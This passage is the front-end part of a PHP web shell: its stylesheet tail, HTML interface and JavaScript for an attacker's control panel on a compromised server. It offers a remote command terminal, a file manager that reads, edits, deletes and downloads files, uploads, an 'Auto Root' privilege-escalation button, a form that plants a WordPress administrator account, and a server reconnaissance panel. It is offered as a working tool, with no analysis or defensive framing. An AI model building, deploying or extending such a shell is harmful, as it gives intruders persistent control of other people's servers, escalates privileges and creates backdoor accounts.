        .modal-close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-primary);
        }
        
        /* Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1001;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .toast {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 15px 20px;
            min-width: 300px;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.3s ease;
        }
        
        .toast.success {
            border-color: var(--accent-success);
        }
        
        .toast.error {
            border-color: var(--accent-danger);
        }
        
        .toast-icon {
            font-size: 20px;
        }
        
        .toast.success .toast-icon {
            color: var(--accent-success);
        }
        
        .toast.error .toast-icon {
            color: var(--accent-danger);
        }
        
        .toast-message {
            flex: 1;
            font-size: 14px;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 15px;
                padding: 15px;
            }
            
            .nav-tabs {
                padding: 0 15px;
            }
            
            .main-content {
                padding: 15px;
            }
            
            .file-item {
                flex-wrap: wrap;
            }
            
            .file-actions {
                width: 100%;
                margin-top: 10px;
                justify-content: flex-end;
            }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--bg-tertiary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }
        
        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid var(--border-color);
            border-top-color: var(--accent-primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        /* Progress Bar */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: var(--bg-tertiary);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="header-left">
            <div class="logo">🔥 <?= SHELL_NAME ?></div>
            <span class="version-badge">v<?= SHELL_VERSION ?></span>
        </div>
        <div class="header-right">
            <div class="server-info">
                🖥️ <?= htmlspecialchars($shell->serverInfo['server_ip']) ?> | 
                👤 <?= htmlspecialchars($shell->serverInfo['current_user']) ?> | 
                🐘 PHP <?= htmlspecialchars($shell->serverInfo['php_version']) ?>
            </div>
            <button class="logout-btn" onclick="logout()">Logout</button>
        </div>
    </header>
    
    <!-- Navigation -->
    <nav class="nav-tabs">
        <div class="nav-tab active" data-tab="terminal">💻 Terminal</div>
        <div class="nav-tab" data-tab="files">📁 File Manager</div>
        <div class="nav-tab" data-tab="upload">📤 Upload</div>
        <div class="nav-tab" data-tab="auto_root">🔑 Auto Root</div>
        <div class="nav-tab" data-tab="wp_admin">🔧 WP Admin</div>
        <div class="nav-tab" data-tab="server_info">ℹ️ Server Info</div>
    </nav>
    
    <!-- Main Content -->
    <main class="main-content">
        <!-- Terminal Tab -->
        <div class="tab-content active" id="terminal">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">💻 Terminal</h2>
                    <button class="btn btn-secondary" onclick="clearTerminal()">Clear</button>
                </div>
                <div class="terminal" id="terminal-output">
                    <div class="terminal-output">Welcome to <?= SHELL_NAME ?> v<?= SHELL_VERSION ?></div>
                    <div class="terminal-output">Type 'help' for available commands</div>
                    <div class="terminal-output">&nbsp;</div>
                </div>
                <div class="terminal-input">
                    <span class="terminal-prompt">$</span>
                    <input type="text" id="terminal-input" placeholder="Type command..." autofocus>
                </div>
            </div>
        </div>
        
        <!-- File Manager Tab -->
        <div class="tab-content" id="files">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">📁 File Manager</h2>
                    <div style="display: flex; gap: 10px;">
                        <button class="btn btn-primary" onclick="showModal('mkdir-modal')">📁 New Folder</button>
                        <button class="btn btn-success" onclick="showModal('newfile-modal')">📄 New File</button>
                    </div>
                </div>
                <div class="file-manager">
                    <div class="file-manager-header">
                        <div class="breadcrumb" id="breadcrumb">
                            <a href="#" onclick="navigateTo('<?= getcwd() ?>')">Home</a>
                        </div>
                        <div style="display: flex; gap: 10px;">
                            <button class="btn btn-secondary" onclick="refreshFiles()">🔄 Refresh</button>
                        </div>
                    </div>
                    <div class="file-list" id="file-list">
                        <!-- Files will be loaded here -->
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Upload Tab -->
        <div class="tab-content" id="upload">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">📤 Upload File</h2>
                </div>
                <div class="upload-area" id="upload-area" onclick="document.getElementById('file-input').click()">
                    <div class="upload-icon">📤</div>
                    <div class="upload-text">Drag & drop file here or click to browse</div>
                    <div class="upload-hint">Maximum upload size: <?= ini_get('upload_max_filesize') ?></div>
                    <input type="file" id="file-input" style="display: none;" onchange="handleFileSelect(this.files[0])">
                </div>
                <div class="progress-bar" id="upload-progress" style="display: none;">
                    <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
                </div>
                <div id="upload-status"></div>
            </div>
        </div>
        
        <!-- Auto Root Tab -->
        <div class="tab-content" id="auto_root">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">🔑 Auto Root Shell</h2>
                    <button class="btn btn-primary" onclick="runAutoRoot()">🚀 Run Auto Root</button>
                </div>
                <div class="output-console" id="autroot-output">
                    Click "Run Auto Root" to attempt privilege escalation...
                </div>
            </div>
        </div>
        
        <!-- WP Admin Tab -->
        <div class="tab-content" id="wp_admin">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">🔧 Create WordPress Admin</h2>
                </div>
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" class="form-control" id="wp-username" placeholder="admin">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="text" class="form-control" id="wp-password" placeholder="StrongPassword123!">
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" class="form-control" id="wp-email" placeholder="admin@example.com">
                </div>
                <button class="btn btn-primary" onclick="createWPAdmin()">🔨 Create Admin</button>
                <div class="output-console" id="wpadmin-output" style="margin-top: 20px; display: none;"></div>
            </div>
        </div>
        
        <!-- Server Info Tab -->
        <div class="tab-content" id="server_info">
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">ℹ️ Server Information</h2>
                </div>
                <div class="info-grid">
                    <div class="info-item">
                        <div class="info-label">Server IP</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['server_ip']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Server Software</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['server_software']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">PHP Version</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['php_version']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Operating System</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['os']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Server Name</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['server_name']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Document Root</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['document_root']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Current User</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['current_user']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Safe Mode</div>
                        <div class="info-value"><?= $shell->serverInfo['safe_mode'] ? 'On' : 'Off' ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Open Basedir</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['open_basedir'] ?: 'None') ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Disabled Functions</div>
                        <div class="info-value"><?= htmlspecialchars($shell->serverInfo['disabled_functions'] ?: 'None') ?></div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    
    <!-- Modals -->
    <!-- New Folder Modal -->
    <div class="modal-overlay" id="mkdir-modal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">📁 New Folder</h3>
                <button class="modal-close" onclick="hideModal('mkdir-modal')">&times;</button>
            </div>
            <div class="form-group">
                <label>Folder Name</label>
                <input type="text" class="form-control" id="new-dir-name" placeholder="folder_name">
            </div>
            <button class="btn btn-primary" onclick="createDirectory()">Create</button>
        </div>
    </div>
    
    <!-- New File Modal -->
    <div class="modal-overlay" id="newfile-modal">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">📄 New File</h3>
                <button class="modal-close" onclick="hideModal('newfile-modal')">&times;</button>
            </div>
            <div class="form-group">
                <label>File Name</label>
                <input type="text" class="form-control" id="new-file-name" placeholder="file.txt">
            </div>
            <div class="form-group">
                <label>Content</label>
                <textarea class="form-control" id="new-file-content" placeholder="File content..."></textarea>
            </div>
            <button class="btn btn-primary" onclick="createFile()">Create</button>
        </div>
    </div>
    
    <!-- Edit File Modal -->
    <div class="modal-overlay" id="editfile-modal">
        <div class="modal" style="max-width: 800px;">
            <div class="modal-header">
                <h3 class="modal-title">✏️ Edit File</h3>
                <button class="modal-close" onclick="hideModal('editfile-modal')">&times;</button>
            </div>
            <div class="form-group">
                <label>File Path</label>
                <input type="text" class="form-control" id="edit-file-path" readonly>
            </div>
            <div class="form-group">
                <label>Content</label>
                <textarea class="form-control" id="edit-file-content" style="min-height: 300px;"></textarea>
            </div>
            <button class="btn btn-primary" onclick="saveFile()">Save</button>
        </div>
    </div>
    
    <!-- Toast Container -->
    <div class="toast-container" id="toast-container"></div>
    
    <script>
        // ============================================================
        // TAB NAVIGATION
        // ============================================================
        document.querySelectorAll('.nav-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                
                tab.classList.add('active');
                document.getElementById(tab.dataset.tab).classList.add('active');
                
                if (tab.dataset.tab === 'files') {
                    loadFiles();
                }
            });
        });
        
        // ============================================================
        // TERMINAL
        // ============================================================
        const terminalInput = document.getElementById('terminal-input');
        const terminalOutput = document.getElementById('terminal-output');
        
        terminalInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const command = terminalInput.value.trim();
                if (command) {
                    executeCommand(command);
                    terminalInput.value = '';
                }
            }
        });
        
        function executeCommand(command) {
            appendToTerminal('$ ' + command);
            
            fetch('?action=terminal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'command=' + encodeURIComponent(command)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    appendToTerminal(data.output);
                } else {
                    appendToTerminal('Error: ' + data.message, 'error');
                }
            })
            .catch(error => {
                appendToTerminal('Error: ' + error.message, 'error');
            });
        }
        
        function appendToTerminal(text, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'terminal-output';
            if (type === 'error') div.style.color = '#ff4757';
            div.textContent = text;
            terminalOutput.appendChild(div);
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }
        
        function clearTerminal() {
            terminalOutput.innerHTML = '';
        }
        
        // ============================================================
        // FILE MANAGER
        // ============================================================
        let currentDir = '<?= getcwd() ?>';
        
        function loadFiles(dir = currentDir) {
            currentDir = dir;
            fetch('?action=list_files&dir=' + encodeURIComponent(dir))
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    renderFiles(data.files);
                    updateBreadcrumb(data.current_dir);
                }
            });
        }
        
        function renderFiles(files) {
            const fileList = document.getElementById('file-list');
            fileList.innerHTML = '';
            
            files.forEach(file => {
                const item = document.createElement('div');
                item.className = 'file-item';
                
                const icon = file.type === 'dir' ? '📁' : '📄';
                const iconClass = file.type === 'dir' ? 'dir' : 'file';
                
                item.innerHTML = `
                    <div class="file-icon ${iconClass}">${icon}</div>
                    <div class="file-info">
                        <div class="file-name">${file.name}</div>
                        <div class="file-meta">${file.size} | ${file.permissions} | ${file.modified}</div>
                    </div>
                    <div class="file-actions">
                        ${file.type === 'dir' ? 
                            `<button class="file-action-btn" onclick="loadFiles('${file.path}')">Open</button>` :
                            `<button class="file-action-btn" onclick="editFile('${file.path}')">Edit</button>
                             <button class="file-action-btn" onclick="downloadFile('${file.path}')">Download</button>`
                        }
                        <button class="file-action-btn" onclick="deleteItem('${file.path}')">Delete</button>
                    </div>
                `;
                
                fileList.appendChild(item);
            });
        }
        
        function updateBreadcrumb(path) {
            const breadcrumb = document.getElementById('breadcrumb');
            const parts = path.split('/').filter(p => p);
            let html = '<a href="#" onclick="loadFiles(\'/\')">/</a>';
            let currentPath = '';
            
            parts.forEach((part, index) => {
                currentPath += '/' + part;
                html += ' / <a href="#" onclick="loadFiles(\'' + currentPath + '\')">' + part + '</a>';
            });
            
            breadcrumb.innerHTML = html;
        }
        
        function refreshFiles() {
            loadFiles(currentDir);
        }
        
        function navigateTo(path) {
            loadFiles(path);
        }
        
        // ============================================================
        // FILE OPERATIONS
        // ============================================================
        function editFile(path) {
            fetch('?action=read_file&file=' + encodeURIComponent(path))
            .then(response => response.json())
            .then(data => {
                if (data.content !== undefined) {
                    document.getElementById('edit-file-path').value = path;
                    document.getElementById('edit-file-content').value = data.content;
                    showModal('editfile-modal');
                }
            });
        }
        
        function saveFile() {
            const path = document.getElementById('edit-file-path').value;
            const content = document.getElementById('edit-file-content').value;
            
            fetch('?action=write_file', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'file=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                showToast(data.message, data.success ? 'success' : 'error');
                hideModal('editfile-modal');
            });
        }
        
        function deleteItem(path) {
            if (confirm('Are you sure you want to delete this?')) {
                fetch('?action=delete', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: 'path=' + encodeURIComponent(path)
                })
                .then(response => response.json())
                .then(data => {
                    showToast(data.message, data.success ? 'success' : 'error');
                    refreshFiles();
                });
            }
        }
        
        function downloadFile(path) {
            window.location.href = '?action=download&file=' + encodeURIComponent(path);
        }
        
        // ============================================================
        // UPLOAD
        // ============================================================
        const uploadArea = document.getElementById('upload-area');
        
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFileSelect(files[0]);
            }
        });
        
        function handleFileSelect(file) {
            if (!file) return;
            
            const formData = new FormData();
            formData.append('upload_file', file);
            
            const progressBar = document.getElementById('upload-progress');
            const progressFill = document.getElementById('progress-fill');
            const status = document.getElementById('upload-status');
            
            progressBar.style.display = 'block';
            progressFill.style.width = '0%';
            status.innerHTML = '';
            
            const xhr = new XMLHttpRequest();
            
            xhr.upload.addEventListener('progress', (e) => {
                if (e.lengthComputable) {
                    const percent = (e.loaded / e.total) * 100;
                    progressFill.style.width = percent + '%';
                }
            });
            
            xhr.addEventListener('load', () => {
                progressFill.style.width = '100%';
                try {
                    const response = JSON.parse(xhr.responseText);
                    showToast(response.message, response.success ? 'success' : 'error');
                } catch (e) {
                    showToast('Upload completed', 'success');
                }
                setTimeout(() => {
                    progressBar.style.display = 'none';
                }, 2000);
            });
            
            xhr.addEventListener('error', () => {
                showToast('Upload failed', 'error');
                progressBar.style.display = 'none';
            });
            
            xhr.open('POST', '?action=upload');
            xhr.send(formData);
        }
        
        // ============================================================
        // DIRECTORY OPERATIONS
        // ============================================================
        function createDirectory() {
            const name = document.getElementById('new-dir-name').value.trim();
            if (!name) {
                showToast('Please enter a folder name', 'error');
                return;
            }
            
            fetch('?action=mkdir', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'dir_name=' + encodeURIComponent(name)
            })
            .then(response => response.json())
            .then(data => {
                showToast(data.message, data.success ? 'success' : 'error');
                if (data.success) {
                    hideModal('mkdir-modal');
                    document.getElementById('new-dir-name').value = '';
                    refreshFiles();
                }
            });
        }
        
        function createFile() {
            const name = document.getElementById('new-file-name').value.trim();
            const content = document.getElementById('new-file-content').value;
            
            if (!name) {
                showToast('Please enter a file name', 'error');
                return;
            }
            
            const path = currentDir + '/' + name;
            
            fetch('?action=write_file', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'file=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                showToast(data.message, data.success ? 'success' : 'error');
                if (data.success) {
                    hideModal('newfile-modal');
                    document.getElementById('new-file-name').value = '';
                    document.getElementById('new-file-content').value = '';
                    refreshFiles();
                }
            });
        }
        
        // ============================================================
        // AUTO ROOT
        // ============================================================
        function runAutoRoot() {
            const output = document.getElementById('autroot-output');
            output.innerHTML = '<div class="spinner"></div> Running auto root...';
            
            fetch('?action=auto_root')
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    output.textContent = data.output;
                    output.className = 'output-console success';
                } else {
                    output.textContent = 'Error: ' + data.message;
                    output.className = 'output-console error';
                }
            })
            .catch(error => {
                output.textContent = 'Error: ' + error.message;
                output.className = 'output-console error';
            });
        }
        
        // ============================================================
        // WP ADMIN
        // ============================================================
        function createWPAdmin() {
            const username = document.getElementById('wp-username').value.trim();
            const password = document.getElementById('wp-password').value.trim();
            const email = document.getElementById('wp-email').value.trim();
            
            if (!username || !password || !email) {
                showToast('Please fill all fields', 'error');
                return;
            }
            
            const output = document.getElementById('wpadmin-output');
            output.style.display = 'block';
            output.innerHTML = '<div class="spinner"></div> Creating admin user...';
            
            fetch('?action=wp_admin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'wp_username=' + encodeURIComponent(username) + 
                     '&wp_password=' + encodeURIComponent(password) + 
                     '&wp_email=' + encodeURIComponent(email)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    output.textContent = data.output;
                    output.className = 'output-console success';
                } else {
                    output.textContent = 'Error: ' + data.message;
                    output.className = 'output-console error';
                }
            })
            .catch(error => {
                output.textContent = 'Error: ' + error.message;
                output.className = 'output-console error';
            });
        }
        
        // ============================================================
        // MODAL & TOAST
        // ============================================================
        function showModal(id) {
            document.getElementById(id).classList.add('active');
        }
        
        function hideModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        function showToast(message, type = 'success') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.innerHTML = `
                <span class="toast-icon">${type === 'success' ? '✓' : '✗'}</span>
                <span class="toast-message">${message}</span>
            `;
            container.appendChild(toast);
            
            setTimeout(() => {
                toast.style.opacity = '0';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }
        
        // ============================================================
        // LOGOUT
        // ============================================================
        function logout() {
            window.location.href = '?action=logout';
        }
        
        // ============================================================
        // KEYBOARD SHORTCUTS
        // ============================================================
        document.addEventListener('keydown', (e) => {
            // Ctrl+L to clear terminal
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                clearTerminal();
            }
            
            // Ctrl+U to focus upload
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                document.getElementById('file-input').click();
            }
        });
        
        // Close modals on outside click
        document.querySelectorAll('.modal-overlay').forEach(overlay => {
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    overlay.classList.remove('active');
                }
            });
        });
    </script>
</body>
</html>
